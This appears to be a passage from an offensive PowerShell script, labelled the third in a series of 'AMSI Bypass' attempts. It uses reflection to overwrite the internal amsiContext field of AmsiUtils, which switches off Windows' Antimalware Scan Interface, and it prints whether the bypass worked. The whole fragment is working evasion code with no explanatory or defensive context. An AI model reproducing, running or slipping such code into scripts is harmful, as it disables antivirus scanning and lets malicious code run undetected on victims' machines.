try {
        [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x0)
        Write-Host "[+] AMSI Bypass 3: Success" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 3: Failed" -ForegroundColor Red
    }
